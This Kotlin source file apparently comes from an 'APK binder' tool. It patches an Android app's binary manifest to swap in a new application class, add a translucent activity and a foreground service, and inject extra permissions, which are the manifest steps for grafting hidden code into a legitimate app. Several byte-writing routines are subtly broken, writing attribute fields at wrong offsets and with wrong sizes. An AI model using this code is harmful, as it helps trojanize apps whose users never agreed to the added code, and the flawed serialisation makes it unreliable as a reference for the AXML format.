package Com.devhs.apkbinder.binder

import java.io.ByteArrayOutputStream

object AxmlPatcher {

    private const val CHUNK_STRING_POOL = 0x0001
    private const val CHUNK_RESOURCE_MAP = 0x0180
    private const val CHUNK_START_ELEMENT = 0x0102
    private const val CHUNK_END_ELEMENT = 0x0103
    private const val FLAG_UTF8 = 0x100
    private const val TYPE_STRING = 0x03
    private const val TYPE_REFERENCE = 0x01
    private const val TYPE_INT_DEC = 0x10
    private const val ANDROID_NS = "http://schemas.android.com/apk/res/android"

    const val ATTR_NAME = 0x01010003
    const val ATTR_THEME = 0x01010000
    const val ATTR_FG_TYPE = 0x01010599
    const val STYLE_TRANSLUCENT = 0x0103000b

    sealed class Value {
        data class Str(val v: String) : Value()
        data class Ref(val v: Int) : Value()
        data class Dec(val v: Int) : Value()
    }

    class Attr(val name: String, val resId: Int, val value: Value)
    class Element(val name: String, val attrs: List<Attr>)

    private class Pool(
        val start: Int,
        val size: Int,
        val headerSize: Int,
        val count: Int,
        val styleCount: Int,
        val flags: Int,
        val stringsStart: Int,
        val stylesStart: Int
    )

    private fun readPool(xml: ByteArray, start: Int): Pool = Pool(
        start = start,
        size = i32(xml, start + 4),
        headerSize = u16(xml, start + 2),
        count = i32(xml, start + 8),
        styleCount = i32(xml, start + 12),
        flags = i32(xml, start + 16),
        stringsStart = i32(xml, start + 20),
        stylesStart = i32(xml, start + 24)
    )

    private fun stringDataBase(pool: Pool): Int {
        val declared = pool.start + pool.stringsStart
        if (pool.stringsStart > 0 && declared < pool.start + pool.size) return declared
        return pool.start + pool.headerSize + pool.count * 4 + pool.styleCount * 4
    }

    private fun stringOffset(xml: ByteArray, pool: Pool, index: Int): Int =
        stringDataBase(pool) + i32(xml, pool.start + pool.headerSize + index * 4)

    private fun decodeAt(xml: ByteArray, off: Int, utf8: Boolean): String? = try {
        if (off < 0 || off >= xml.size) null
        else if (utf8) {
            val a = readVarint(xml, off)
            if (a == null) null else {
                val b = readVarint(xml, a.second)
                if (b == null || b.second + b.first > xml.size) null
                else String(xml, b.second, b.first, Charsets.UTF_8)
            }
        } else {
            val a = readVarint(xml, off)
            if (a == null || a.second + a.first * 2 > xml.size) null
            else {
                val sb = StringBuilder(a.first)
                for (i in 0 until a.first) sb.append(u16(xml, a.second + i * 2).toChar())
                sb.toString()
            }
        }
    } catch (_: Throwable) {
        null
    }

    private fun matches(xml: ByteArray, pool: Pool, index: Int, target: String): Boolean {
        if (index < 0 || index >= pool.count) return false
        val off = stringOffset(xml, pool, index)
        val declared = (pool.flags and FLAG_UTF8) != 0
        if (decodeAt(xml, off, declared) == target) return true
        return decodeAt(xml, off, !declared) == target
    }

    private fun indexOf(xml: ByteArray, pool: Pool, target: String): Int {
        for (i in 0 until pool.count) if (matches(xml, pool, i, target)) return i
        return -1
    }

    private fun findApplication(xml: ByteArray): Int {
        val pool = readPool(xml, 8)
        var pos = 8
        while (pos + 8 <= xml.size) {
            val type = u16(xml, pos)
            val size = i32(xml, pos + 4)
            if (type == CHUNK_START_ELEMENT && matches(xml, pool, i32(xml, pos + 20), "application")) {
                return pos
            }
            pos += if (size >= 8 && pos + size <= xml.size) size else 4
        }

        var p = 8
        var depth = 0
        var lastChild = -1
        while (p + 8 <= xml.size) {
            val type = u16(xml, p)
            val size = i32(xml, p + 4)
            if (type == CHUNK_START_ELEMENT) {
                depth++
                if (depth == 2) lastChild = p
            } else if (type == CHUNK_END_ELEMENT) {
                depth--
            }
            p += if (size >= 8 && p + size <= xml.size) size else 4
        }
        return lastChild
    }

    /**
     * সব START_ELEMENT চাঙ্কের size পুনরায় হিসাব করে, যাতে ইনসার্শনের পর
     * কাঠামো ধারাবাহিক থাকে। এটাই ম্যানিফেস্ট ভাঙা রোধ করে।
     */
    private fun fixSizes(xml: ByteArray) {
        val stack = ArrayList<Int>()
        var pos = 8
        while (pos + 8 <= xml.size) {
            val type = u16(xml, pos)
            val size = i32(xml, pos + 4)
            when (type) {
                CHUNK_START_ELEMENT -> stack.add(pos)
                CHUNK_END_ELEMENT -> {
                    if (stack.isNotEmpty()) {
                        val start = stack.removeAt(stack.size - 1)
                        putI32(xml, start + 4, pos + size - start)
                    }
                }
            }
            pos += if (size >= 8 && pos + size <= xml.size) size else 4
        }
        putI32(xml, 4, xml.size)
    }

    fun readApplicationName(xml: ByteArray): String? = try {
        val pos = findApplication(xml)
        if (pos < 0) null else {
            val pool = readPool(xml, 8)
            val count = u16(xml, pos + 28)
            var found: String? = null
            for (i in 0 until count) {
                val a = pos + 36 + i * 20
                if (!matches(xml, pool, i32(xml, a + 4), "name")) continue
                val raw = i32(xml, a + 8)
                val data = i32(xml, a + 16)
                val idx = if (raw >= 0) raw else data
                if (idx < 0 || idx >= pool.count) continue
                val off = stringOffset(xml, pool, idx)
                val declared = (pool.flags and FLAG_UTF8) != 0
                val s = decodeAt(xml, off, declared) ?: decodeAt(xml, off, !declared)
                if (!s.isNullOrBlank()) {
                    found = s
                    break
                }
            }
            found
        }
    } catch (_: Throwable) {
        null
    }

    fun patch(
        xml: ByteArray,
        newAppClass: String,
        activityClass: String,
        serviceClass: String,
        permissions: List<String>
    ): ByteArray {
        val added = mutableListOf<String>()
        val attrIds = LinkedHashMap<String, Int>()

        fun addAttr(name: String, id: Int) {
            if (!added.contains(name)) {
                added.add(name)
                attrIds[name] = id
            }
        }
        addAttr("name", ATTR_NAME)
        addAttr("theme", ATTR_THEME)
        addAttr("foregroundServiceType", ATTR_FG_TYPE)
        listOf("activity", "service", "uses-permission").forEach { if (!added.contains(it)) added.add(it) }
        added.add(newAppClass)
        added.add(activityClass)
        added.add(serviceClass)
        permissions.forEach { if (!added.contains(it)) added.add(it) }

        val poolBefore = readPool(xml, 8)
        var out = appendStrings(xml, poolBefore, added, attrIds)
        out = setApplicationName(out, newAppClass)

        out = insertChildren(
            out,
            listOf(
                Element(
                    "activity",
                    listOf(
                        Attr("name", ATTR_NAME, Value.Str(activityClass)),
                        Attr("theme", ATTR_THEME, Value.Ref(STYLE_TRANSLUCENT))
                    )
                ),
                Element(
                    "service",
                    listOf(
                        Attr("name", ATTR_NAME, Value.Str(serviceClass)),
                        Attr("foregroundServiceType", ATTR_FG_TYPE, Value.Dec(1))
                    )
                )
            )
        )

        out = insertBeforeApplication(
            out,
            permissions.map { Element("uses-permission", listOf(Attr("name", ATTR_NAME, Value.Str(it)))) }
        )

        fixSizes(out)
        return out
    }

    private fun appendStrings(
        xml: ByteArray,
        pool: Pool,
        added: List<String>,
        attrIds: Map<String, Int>
    ): ByteArray {
        val utf8 = (pool.flags and FLAG_UTF8) != 0
        val dataStart = stringDataBase(pool)
        val dataEnd = if (pool.styleCount > 0 && pool.stylesStart > 0) pool.start + pool.stylesStart
        else pool.start + pool.size
        val safeEnd = if (dataEnd < dataStart) dataStart else minOf(dataEnd, xml.size)
        val oldData = xml.copyOfRange(dataStart, safeEnd)
        val styleData = if (pool.styleCount > 0 && pool.stylesStart > 0)
            xml.copyOfRange(pool.start + pool.stylesStart, pool.start + pool.size) else ByteArray(0)

        val data = ByteArrayOutputStream()
        data.write(oldData)
        val newOffsets = IntArray(added.size)
        for ((i, s) in added.withIndex()) {
            while (data.size() % 4 != 0) data.write(0)
            newOffsets[i] = data.size()
            if (utf8) {
                writeVarint(data, s.length)
                val bytes = s.toByteArray(Charsets.UTF_8)
                writeVarint(data, bytes.size)
                data.write(bytes)
                data.write(0)
            } else {
                writeVarint(data, s.length)
                for (ch in s) {
                    data.write(ch.code and 0xFF)
                    data.write((ch.code shr 8) and 0xFF)
                }
                data.write(0)
                data.write(0)
            }
        }
        while (data.size() % 4 != 0) data.write(0)

        val newCount = pool.count + added.size
        val newData = data.toByteArray()
        val stringsStart = pool.headerSize + newCount * 4 + pool.styleCount * 4
        val stylesStart = if (pool.styleCount > 0) stringsStart + newData.size else 0
        val chunkSize = stringsStart + newData.size + styleData.size

        val out = ByteArrayOutputStream()
        out.write(xml, 0, pool.start)
        out.writeU16(CHUNK_STRING_POOL)
        out.writeU16(pool.headerSize)
        out.writeI32(chunkSize)
        out.writeI32(newCount)
        out.writeI32(pool.styleCount)
        out.writeI32(pool.flags)
        out.writeI32(stringsStart)
        out.writeI32(stylesStart)
        for (i in 0 until pool.count) out.writeI32(i32(xml, pool.start + pool.headerSize + i * 4))
        newOffsets.forEach { out.writeI32(it) }
        for (i in 0 until pool.styleCount) {
            out.writeI32(i32(xml, pool.start + pool.headerSize + pool.count * 4 + i * 4))
        }
        out.write(newData)
        out.write(styleData)
        out.write(xml, pool.start + pool.size, xml.size - pool.start - pool.size)

        val result = out.toByteArray()
        putI32(result, 4, result.size)
        return extendResourceMap(result, newCount, attrIds)
    }

    private fun extendResourceMap(xml: ByteArray, needed: Int, ids: Map<String, Int>): ByteArray {
        val pool = readPool(xml, 8)
        val pos = pool.start + pool.size
        if (pos + 8 > xml.size || u16(xml, pos) != CHUNK_RESOURCE_MAP) return xml

        val mapSize = i32(xml, pos + 4)
        val entries = (mapSize - 8) / 4
        val grow = (needed - entries).coerceAtLeast(0)

        val resolved = ids.mapNotNull { (name, id) ->
            val idx = indexOf(xml, pool, name)
            if (idx >= 0) idx to id else null
        }

        val out = ByteArrayOutputStream()
        out.write(xml, 0, pos + mapSize)
        repeat(grow) { out.writeI32(0) }
        out.write(xml, pos + mapSize, xml.size - pos - mapSize)
        val result = out.toByteArray()

        putI32(result, pos + 4, mapSize + grow * 4)
        putI32(result, 4, result.size)
        resolved.forEach { (idx, id) -> putI32(result, pos + 8 + idx * 4, id) }
        return result
    }

    private fun setApplicationName(xml: ByteArray, cls: String): ByteArray {
        val pos = findApplication(xml)
        require(pos >= 0) { "application element not found" }

        val pool = readPool(xml, 8)
        val nameIdx = indexOf(xml, pool, "name")
        val nsIdx = indexOf(xml, pool, ANDROID_NS)
        val clsIdx = indexOf(xml, pool, cls)
        val count = u16(xml, pos + 28)
        val base = pos + 36

        for (i in 0 until count) {
            val a = base + i * 20
            if (matches(xml, pool, i32(xml, a + 4), "name")) {
                putI32(xml, a + 8, clsIdx)
                putI32(xml, a + 12, 8)
                putI32(xml, a + 16, 0)
                xml[a + 18] = TYPE_STRING.toByte()
                putI32(xml, a + 16, clsIdx)
                return xml
            }
        }

        val attr = ByteArray(20)
        putI32(attr, 0, nsIdx)
        putI32(attr, 4, nameIdx)
        putI32(attr, 8, clsIdx)
        putI32(attr, 12, 8)
        attr[14] = TYPE_STRING.toByte()
        putI32(attr, 16, clsIdx)

        val out = insertAt(xml, base + count * 20, attr)
        val p = findApplication(out)
        putU16(out, p + 28, count + 1)
        putI32(out, p + 4, i32(out, p + 4) + 20)
        return out
    }

    private fun insertChildren(xml: ByteArray, elements: List<Element>): ByteArray {
        val pos = findApplication(xml)
        require(pos >= 0) { "application element not found" }
        val count = u16(xml, pos + 28)
        val insertPos = pos + 36 + count * 20

        val pool = readPool(xml, 8)
        val nsIdx = indexOf(xml, pool, ANDROID_NS)

        val buf = ByteArrayOutputStream()
        elements.forEach { el ->
            val nameIdx = indexOf(xml, pool, el.name)
            buf.writeU16(CHUNK_START_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(36 + el.attrs.size * 20)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(nameIdx)
            buf.writeU16(20)
            buf.writeU16(20)
            buf.writeU16(el.attrs.size)
            buf.writeU16(0)
            buf.writeU16(0)
            buf.writeU16(0)
            el.attrs.forEach { at ->
                buf.writeI32(nsIdx)
                buf.writeI32(indexOf(xml, pool, at.name))
                when (val v = at.value) {
                    is Value.Str -> {
                        val idx = indexOf(xml, pool, v.v)
                        buf.writeI32(idx)
                        buf.writeI32(8)
                        buf.writeI32(0)
                        buf.writeU16(TYPE_STRING)
                        buf.writeI32(idx)
                    }
                    is Value.Ref -> {
                        buf.writeI32(-1)
                        buf.writeI32(8)
                        buf.writeI32(0)
                        buf.writeU16(TYPE_REFERENCE)
                        buf.writeI32(v.v)
                    }
                    is Value.Dec -> {
                        buf.writeI32(-1)
                        buf.writeI32(8)
                        buf.writeI32(0)
                        buf.writeU16(TYPE_INT_DEC)
                        buf.writeI32(v.v)
                    }
                }
            }
            buf.writeU16(CHUNK_END_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(24)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(nameIdx)
        }

        return insertAt(xml, insertPos, buf.toByteArray())
    }

    private fun insertBeforeApplication(xml: ByteArray, elements: List<Element>): ByteArray {
        val pos = findApplication(xml)
        if (pos < 0) return xml

        val pool = readPool(xml, 8)
        val elemIdx = indexOf(xml, pool, "uses-permission")
        val nameIdx = indexOf(xml, pool, "name")
        val nsIdx = indexOf(xml, pool, ANDROID_NS)

        val buf = ByteArrayOutputStream()
        elements.forEach { el ->
            val valueIdx = indexOf(xml, pool, (el.attrs.first().value as Value.Str).v)
            buf.writeU16(CHUNK_START_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(56)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(elemIdx)
            buf.writeU16(20)
            buf.writeU16(20)
            buf.writeU16(1)
            buf.writeU16(0)
            buf.writeU16(0)
            buf.writeU16(0)
            buf.writeI32(nsIdx)
            buf.writeI32(nameIdx)
            buf.writeI32(valueIdx)
            buf.writeI32(8)
            buf.writeI32(0)
            buf.writeU16(TYPE_STRING)
            buf.writeI32(valueIdx)
            buf.writeU16(CHUNK_END_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(24)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(elemIdx)
        }
        return insertAt(xml, pos, buf.toByteArray())
    }

    private fun insertAt(xml: ByteArray, pos: Int, block: ByteArray): ByteArray {
        val out = ByteArrayOutputStream()
        out.write(xml, 0, pos)
        out.write(block)
        out.write(xml, pos, xml.size - pos)
        val result = out.toByteArray()
        putI32(result, 4, result.size)
        return result
    }

    private fun readVarint(b: ByteArray, off: Int): Pair<Int, Int>? {
        if (off < 0 || off >= b.size) return null
        val first = b[off].toInt() and 0xFF
        return if (first and 0x80 != 0) {
            if (off + 1 >= b.size) null
            else (((first and 0x7F) shl 8) or (b[off + 1].toInt() and 0xFF)) to off + 2
        } else first to off + 1
    }

    private fun writeVarint(out: ByteArrayOutputStream, v: Int) {
        if (v > 0x7F) {
            out.write(((v shr 8) or 0x80) and 0xFF)
            out.write(v and 0xFF)
        } else out.write(v)
    }

    private fun u16(b: ByteArray, o: Int) = (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8)

    private fun i32(b: ByteArray, o: Int) =
        (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8) or
            ((b[o + 2].toInt() and 0xFF) shl 16) or ((b[o + 3].toInt() and 0xFF) shl 24)

    private fun putI32(b: ByteArray, o: Int, v: Int) {
        b[o] = v.toByte()
        b[o + 1] = (v shr 8).toByte()
        b[o + 2] = (v shr 16).toByte()
        b[o + 3] = (v shr 24).toByte()
    }

    private fun putU16(b: ByteArray, o: Int, v: Int) {
        b[o] = v.toByte()
        b[o + 1] = (v shr 8).toByte()
    }

    private fun ByteArrayOutputStream.writeU16(v: Int) {
        write(v and 0xFF)
        write((v shr 8) and 0xFF)
    }

    private fun ByteArrayOutputStream.writeI32(v: Int) {
        write(v and 0xFF)
        write((v shr 8) and 0xFF)
        write((v shr 16) and 0xFF)
        write((v shr 24) and 0xFF)
    }
}
